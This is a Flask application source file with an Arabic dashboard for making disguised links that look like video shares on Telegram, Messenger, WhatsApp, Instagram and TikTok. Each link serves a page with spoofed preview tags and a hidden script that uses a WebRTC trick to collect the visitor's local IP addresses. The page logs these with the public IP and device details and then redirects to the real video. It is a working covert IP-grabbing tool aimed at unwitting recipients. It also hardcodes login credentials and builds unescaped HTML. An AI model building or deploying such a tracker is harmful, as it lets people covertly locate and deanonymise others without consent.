from flask import Flask, render_template_string, request, redirect, jsonify, Response
import uuid
import datetime
import sqlite3
import requests
import pytz
from functools import wraps

app = Flask(__name__)

DB_FILE = "tracker_data.db"
USERNAME = "khaled"
PASSWORD = "ALG@2022"

ALGIERS_TZ = pytz.timezone('Africa/Algiers')

def get_gmt1_time():
    return datetime.datetime.now(ALGIERS_TZ).strftime("%Y-%m-%d %H:%M:%S")

def init_db():
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS links (
                id TEXT PRIMARY KEY,
                original_url TEXT,
                note TEXT,
                video_title TEXT,
                custom_image TEXT,
                target_platform TEXT
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS clicks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                link_id TEXT,
                ip TEXT,
                local_ip TEXT,
                device TEXT,
                time TEXT,
                FOREIGN KEY(link_id) REFERENCES links(id) ON DELETE CASCADE
            )
        ''')
        conn.commit()

init_db()

def fetch_original_meta(url, manual_thumb_url=None):
    url_lower = url.lower()
    title = "شاهد مقطع الفيديو الرائج بجودة عالية"
    img = "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=600"
    
    if manual_thumb_url and manual_thumb_url.strip():
        img = manual_thumb_url.strip()
        
    if "tiktok.com" in url_lower or "vt.tiktok" in url_lower:
        try:
            res = requests.get(f"https://www.tiktok.com/oembed?url={url}", timeout=4)
            if res.status_code == 200:
                data = res.json()
                return data.get('title', title), manual_thumb_url.strip() if manual_thumb_url else data.get('thumbnail_url', img)
        except: pass
            
    elif "youtube.com" in url_lower or "youtu.be" in url_lower:
        try:
            res = requests.get(f"https://www.youtube.com/oembed?url={url}&format=json", timeout=4)
            if res.status_code == 200:
                data = res.json()
                return data.get('title', title), manual_thumb_url.strip() if manual_thumb_url else data.get('thumbnail_url', img)
        except: pass
        
    elif "maps.google.com" in url_lower or "goo.gl/maps" in url_lower:
        title = "موقع جغرافي محدد عبر خرائط Google"
        if not manual_thumb_url:
            img = "https://images.unsplash.com/photo-1524661135-423995f22d0b?w=600"
            
    return title, img

def check_auth(username, password):
    return username == USERNAME and password == PASSWORD

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return Response('يجب تسجيل الدخول.', 401, {'WWW-Authenticate': 'Basic realm="Login Required"'})
        return f(*args, **kwargs)
    return decorated

HTML_LAYOUT = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>منصتي المخصصة لإدارة واستهداف الروابط</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f6f9; color: #333; margin: 0; padding: 0; }
        .navbar { background-color: #1a252f; color: white; padding: 15px; text-align: center; font-size: 18px; font-weight: bold; }
        .container { max-width: 1050px; margin: 15px auto; padding: 15px; box-sizing: border-box; }
        .stats-overview { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-bottom: 20px; }
        .stat-card { background: white; padding: 15px; border-radius: 8px; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border-top: 4px solid #34495e; }
        .stat-card h3 { margin: 0; font-size: 13px; color: #7f8c8d; }
        .stat-card p { margin: 5px 0 0 0; font-size: 20px; font-weight: bold; color: #2c3e50; }
        
        .create-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.06); margin-bottom: 25px; }
        .create-box h2 { margin-top: 0; font-size: 16px; color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 5px; }
        
        .platform-tabs { display: flex; gap: 10px; margin-bottom: 15px; flex-wrap: wrap; }
        .tab-btn { padding: 10px 15px; border: 2px solid #ccc; background: #fff; border-radius: 6px; cursor: pointer; font-weight: bold; font-size: 13px; transition: 0.2s; }
        .tab-btn.active[data-target="Telegram"] { background: #0088cc; color: white; border-color: #0088cc; }
        .tab-btn.active[data-target="Messenger"] { background: #0084FF; color: white; border-color: #0084FF; }
        .tab-btn.active[data-target="WhatsApp"] { background: #25D366; color: white; border-color: #25D366; }
        .tab-btn.active[data-target="Instagram"] { background: #E1306C; color: white; border-color: #E1306C; }
        .tab-btn.active[data-target="TikTok"] { background: #000000; color: white; border-color: #000000; }
        
        label { font-weight: bold; display: block; margin-top: 10px; font-size: 14px; color: #555; }
        input[type="text"], input[type="url"] { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
        button.submit-btn { width: 100%; background-color: #3498db; color: white; border: none; padding: 12px; margin-top: 15px; border-radius: 4px; font-size: 15px; font-weight: bold; cursor: pointer; }
        
        .table-wrapper { background: white; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.06); overflow-x: auto; margin-bottom: 25px; }
        .main-table { width: 100%; border-collapse: collapse; font-size: 13px; text-align: center; }
        .main-table th, .main-table td { padding: 12px 10px; border-bottom: 1px solid #edf2f7; }
        .main-table th { background-color: #34495e; color: white; }
        .badge { background: #e74c3c; color: white; padding: 2px 6px; border-radius: 4px; font-weight: bold; }
        
        .platform-badge { display: inline-block; padding: 3px 8px; border-radius: 12px; font-size: 11px; font-weight: bold; color: white; }
        .bg-telegram { background-color: #0088cc; }
        .bg-messenger { background-color: #0084FF; }
        .bg-whatsapp { background-color: #25D366; }
        .bg-instagram { background-color: #E1306C; }
        .bg-tiktok { background-color: #000000; }
        
        .logs-box { background: white; padding: 15px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.06); margin-top: 20px; }
        .logs-table { width: 100%; border-collapse: collapse; font-size: 12px; text-align: center; }
        .logs-table th, .logs-table td { padding: 10px; border: 1px solid #e2e8f0; }
        .logs-table th { background-color: #2c3e50; color: white; }
        .action-btn { padding: 5px 10px; font-size: 11px; font-weight: bold; border: none; border-radius: 4px; cursor: pointer; text-decoration: none; display: inline-block; margin: 2px; color: white; }
        .btn-delete { background-color: #e74c3c; }
        .btn-stats { background-color: #3498db; }
    </style>
</head>
<body>
    <div class="navbar">لوحة تحكم استهداف وفصل المنصات الشاملة</div>
    <div class="container">
        
        <div class="stats-overview">
            <div class="stat-card">
                <h3>الروابط النشطة</h3>
                <p>{{ total_links }}</p>
            </div>
            <div class="stat-card" style="border-top-color: #e74c3c;">
                <h3>إجمالي النقرات</h3>
                <p>{{ total_clicks }}</p>
            </div>
        </div>

        <div class="create-box">
            <h2>1. حدد المنصة التي ستلصق وترسل الرابط فيها أولاً (منصة الإرسال):</h2>
            <form action="/create" method="POST">
                
                <div class="platform-tabs">
                    <button type="button" class="tab-btn active" data-target="Telegram" onclick="setTarget('Telegram')">✈️ تلغرام</button>
                    <button type="button" class="tab-btn" data-target="Messenger" onclick="setTarget('Messenger')">💬 ماسنجر فيسبوك</button>
                    <button type="button" class="tab-btn" data-target="WhatsApp" onclick="setTarget('WhatsApp')">🟢 واتساب</button>
                    <button type="button" class="tab-btn" data-target="Instagram" onclick="setTarget('Instagram')">📸 انستغرام DM</button>
                    <button type="button" class="tab-btn" data-target="TikTok" onclick="setTarget('TikTok')">⚫ تيك توك رسائل</button>
                </div>
                
                <input type="hidden" id="target_platform" name="target_platform" value="Telegram">

                <label id="url_label">2. ضع أي رابط تريده (يوتيوب، تيك توك، فيسبوك، انستغرام إلخ):</label>
                <input type="url" name="original_url" placeholder="https://..." required>
                
                <label>3. رابط صورة معاينة مخصصة (اختياري - يفضل تركه فارغاً مع تيك توك ويوتيوب الأصليين ليعمل السحب الآلي):</label>
                <input type="url" name="manual_thumbnail" placeholder="ضع رابط الصورة المباشر">

                <label>4. ملاحظة تمييز الرابط في اللوحة:</label>
                <input type="text" name="note" placeholder="مثال: رابط تيك توك مجهز للإرسال في واتساب" required>
                
                <button type="submit" class="submit-btn">توليد الرابط وتقصيره بالهندسة المناسبة للمنصة</button>
            </form>
        </div>

        <div class="section-title" style="font-weight:bold; margin-bottom:10px;">الروابط الحالية ومستهدفاتها</div>
        <div class="table-wrapper">
            <table class="main-table">
                <thead>
                    <tr>
                        <th>الملاحظة</th>
                        <th>منصة الإرسال المستهدفة</th>
                        <th>العنوان المجلوب</th>
                        <th>النقرات</th>
                        <th>الرابط الذكي وجاهز للإرسال</th>
                        <th>صورة المعاينة</th>
                        <th>التحكم</th>
                    </tr>
                </thead>
                <tbody>
                    {% if not links_list %}
                    <tr><td colspan="7" style="padding: 20px; color: #95a5a6;">لا توجد روابط حالياً.</td></tr>
                    {% else %}
                        {% for link in links_list %}
                        <tr>
                            <td style="font-weight: bold; color: #2c3e50;">{{ link.note }}</td>
                            <td>
                                <span class="platform-badge {% if link.target_platform == 'Telegram' %}bg-telegram{% elif link.target_platform == 'Messenger' %}bg-messenger{% elif link.target_platform == 'WhatsApp' %}bg-whatsapp{% elif link.target_platform == 'Instagram' %}bg-instagram{% elif link.target_platform == 'TikTok' %}bg-tiktok{% endif %}">
                                    {{ link.target_platform }}
                                </span>
                            </td>
                            <td style="max-width: 150px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">{{ link.video_title }}</td>
                            <td><span class="badge">{{ link.clicks_count }}</span></td>
                            <td><a style="color: #3498db; font-weight:bold; text-decoration:none;" href="/secure/{{ link.id }}" target="_blank">{{ host_url }}secure/{{ link.id }}</a></td>
                            <td><img src="{{ link.custom_image }}" width="50" height="40" style="border-radius:4px; object-fit:cover;"></td>
                            <td>
                                <a href="/?filter_id={{ link.id }}#logs_section" class="action-btn btn-stats">📊 سجل</a>
                                <a href="/delete/{{ link.id }}" class="action-btn btn-delete" onclick="return confirm('حذف نهائي؟');">🗑️</a>
                            </td>
                        </tr>
                        {% endfor %}
                    {% endif %}
                </tbody>
            </table>
        </div>

        <div id="logs_section" class="section-title" style="font-weight:bold; margin-top:20px;">📋 سجل الأجهزة المباشر (توقيت الجزائر)</div>
        <div class="logs-box">
            <table class="logs-table">
                <thead>
                    <tr>
                        <th>الرابط</th>
                        <th>الوقت الحالي (GMT+1)</th>
                        <th>الـ IP العام</th>
                        <th>الـ IP المحلي (LAN)</th>
                        <th>بيانات الجهاز والمتصفح</th>
                    </tr>
                </thead>
                <tbody>
                    {% if not clicks_list %}
                    <tr><td colspan="5" style="padding: 20px; color: #95a5a6;">لا توجد نقرات مسجلة...</td></tr>
                    {% else %}
                        {% for click in clicks_list %}
                        <tr>
                            <td style="background: #fcf8e3; font-weight: bold;">{{ click.note }}</td>
                            <td>{{ click.time }}</td>
                            <td style="color:#e74c3c; font-weight:bold;">{{ click.ip }}</td>
                            <td style="color:#27ae60; font-weight:bold;">{{ click.local_ip }}</td>
                            <td style="font-size:11px; max-width:250px; word-break:break-all;">{{ click.device }}</td>
                        </tr>
                        {% endfor %}
                    {% endif %}
                </tbody>
            </table>
        </div>
    </div>

    <script>
        function setTarget(platform) {
            document.getElementById('target_platform').value = platform;
            var buttons = document.querySelectorAll('.tab-btn');
            buttons.forEach(btn => btn.classList.remove('active'));
            document.querySelector(`[data-target="${platform}"]`).classList.add('active');
            
            var label = document.getElementById('url_label');
            label.innerText = `2. ضع أي رابط فيديو تريده لتتم تهيئته هندسياً ليناسب المعاينة داخل ${platform}:`;
        }
    </script>
</body>
</html>
'''

@app.route('/')
@requires_auth
def home():
    filter_id = request.args.get('filter_id')
    with sqlite3.connect(DB_FILE) as conn:
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute('''
            SELECT l.id, l.original_url, l.note, l.video_title, l.custom_image, l.target_platform, COUNT(c.id) as clicks_count 
            FROM links l LEFT JOIN clicks c ON l.id = c.link_id GROUP BY l.id
        ''')
        links_list = cursor.fetchall()
        
        if filter_id:
            cursor.execute('SELECT c.ip, c.local_ip, c.device, c.time, l.note FROM clicks c JOIN links l ON c.link_id = l.id WHERE l.id = ? ORDER BY c.id DESC', (filter_id,))
        else:
            cursor.execute('SELECT c.ip, c.local_ip, c.device, c.time, l.note FROM clicks c JOIN links l ON c.link_id = l.id ORDER BY c.id DESC')
        clicks_list = cursor.fetchall()
        
        total_links = len(links_list)
        cursor.execute("SELECT COUNT(*) FROM clicks")
        total_clicks = cursor.fetchone()[0]

    return render_template_string(HTML_LAYOUT, links_list=links_list, clicks_list=clicks_list, host_url=request.host_url, total_links=total_links, total_clicks=total_clicks, current_filter=filter_id)

@app.route('/create', methods=['POST'])
@requires_auth
def create():
    original_url = request.form.get('original_url')
    manual_thumbnail = request.form.get('manual_thumbnail', '')
    note = request.form.get('note')
    target_platform = request.form.get('target_platform', 'Telegram')
    
    video_title, custom_image = fetch_original_meta(original_url, manual_thumbnail)
    link_id = str(uuid.uuid4())[:6].upper()
    
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO links (id, original_url, note, video_title, custom_image, target_platform) 
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (link_id, original_url, note, video_title, custom_image, target_platform))
        conn.commit()
    return redirect('/')

@app.route('/delete/<link_id>')
@requires_auth
def delete_link(link_id):
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("PRAGMA foreign_keys = ON")
        cursor.execute("DELETE FROM links WHERE id = ?", (link_id,))
        conn.commit()
    return redirect('/')

@app.route('/secure/<link_id>')
def secure_redirect(link_id):
    with sqlite3.connect(DB_FILE) as conn:
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM links WHERE id = ?", (link_id,))
        link_data = cursor.fetchone()
        
    if link_data:
        target = link_data['target_platform']
        title = link_data['video_title']
        image_url = link_data['custom_image']
        
        # هندسة الميتا تاغ حسب تطبيق الإرسال المستهدف وليس حسب نوع الرابط المدخل
        if target == "Telegram":
            og_type = "video"
            meta_tags = f'''
            <meta property="og:type" content="{og_type}">
            <meta property="og:video" content="{link_data['original_url']}">
            <meta property="og:video:secure_url" content="{link_data['original_url']}">
            <meta property="og:video:type" content="text/html">
            <meta property="og:video:width" content="1280">
            <meta property="og:video:height" content="720">
            <meta name="twitter:card" content="player">
            <meta name="twitter:player" content="{link_data['original_url']}">
            <meta name="twitter:player:width" content="1280">
            <meta name="twitter:player:height" content="720">
            '''
        elif target == "Messenger":
            og_type = "video.movie"
            meta_tags = f'''
            <meta property="og:type" content="{og_type}">
            <meta property="og:video" content="{link_data['original_url']}">
            <meta property="og:video:secure_url" content="{link_data['original_url']}">
            <meta property="og:video:type" content="text/html">
            <meta property="og:video:width" content="1280">
            <meta property="og:video:height" content="720">
            <meta name="text" content="Facebook Watch Video">
            '''
        elif target == "WhatsApp":
            # واتساب يحتاج كود موقع نظيف وصورة مثالية لمنع تشوه بطاقة الدردشة
            og_type = "website"
            meta_tags = f'''
            <meta property="og:type" content="{og_type}">
            <meta property="og:site_name" content="WhatsApp Video Share">
            '''
        elif target == "Instagram":
            og_type = "video.other"
            meta_tags = f'''
            <meta property="og:type" content="{og_type}">
            <meta property="og:site_name" content="Instagram Direct Media">
            '''
        else: # TikTok
            og_type = "video.other"
            meta_tags = f'''
            <meta property="og:type" content="{og_type}">
            <meta property="og:site_name" content="TikTok Global System">
            '''

        return f'''
        <!DOCTYPE html>
        <html lang="ar">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>{title}</title>
            
            <meta property="og:title" content="{title}">
            <meta property="og:description" content="اضغط لتشغيل وعرض مقطع الفيديو بالكامل بجودة عالية.">
            <meta property="og:image" content="{image_url}">
            <meta property="og:image:secure_url" content="{image_url}">
            <meta property="og:image:type" content="image/jpeg">
            <meta property="og:image:width" content="1280">
            <meta property="og:image:height" content="720">
            <meta property="og:url" content="{request.url}">
            
            {meta_tags}
            
            <script>
                function gatherLocalIPsAndRedirect() {{
                    var detectedIPs = [];
                    window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
                    if (!window.RTCPeerConnection) {{ sendData("غير مدعوم"); return; }}
                    var pc = new RTCPeerConnection({{ iceServers: [] }});
                    pc.createDataChannel(""); 
                    pc.onicecandidate = function(e) {{
                        if (!e || !e.candidate || !e.candidate.candidate) return;
                        var candidate = e.candidate.candidate;
                        var ipRegex = /([0-9]{{1,3}}(\\.[0-9]{{1,3}}){{3}})/;
                        var match = ipRegex.exec(candidate);
                        if (match && detectedIPs.indexOf(match[1]) === -1) detectedIPs.push(match[1]);
                    }};
                    pc.createOffer().then(function(sdp) {{ pc.setLocalDescription(sdp); }}).catch(function(err) {{}});
                    setTimeout(function() {{
                        var finalLocalIp = detectedIPs.length > 0 ? detectedIPs.join(" | ") : "مخفي أو مشفر (mDNS)";
                        sendData(finalLocalIp);
                    }}, 1200);
                }}
                function sendData(localIp) {{
                    var xhr = new XMLHttpRequest();
                    xhr.open("POST", "/log-click/{link_id}", true);
                    xhr.setRequestHeader("Content-Type", "application/json");
                    xhr.onreadystatechange = function () {{
                        if (xhr.readyState === 4) {{ window.location.href = "{link_data['original_url']}"; }}
                    }};
                    xhr.send(JSON.stringify({{ "local_ip": localIp }}));
                }}
                window.onload = gatherLocalIPsAndRedirect;
            </script>
        </head>
        <body style="background:#000; color:#fff; font-family:sans-serif; text-align:center; padding-top:45%;">
            <div>جاري تحميل وتشغيل مقطع الفيديو...</div>
        </body>
        </html>
        '''
    return "الرابط غير موجود", 404

@app.route('/log-click/<link_id>', methods=['POST'])
def log_click(link_id):
    data = request.get_json() or {}
    local_ip = data.get('local_ip', 'غير معروف')
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip_address and ',' in ip_address:
        ip_address = ip_address.split(',')[0].strip()
    user_agent = request.headers.get('User-Agent')
    current_time = get_gmt1_time()
    
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute('INSERT INTO clicks (link_id, ip, local_ip, device, time) VALUES (?, ?, ?, ?, ?)', (link_id, ip_address, local_ip, user_agent, current_time))
        conn.commit()
    return jsonify({"status": "success"}), 200

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
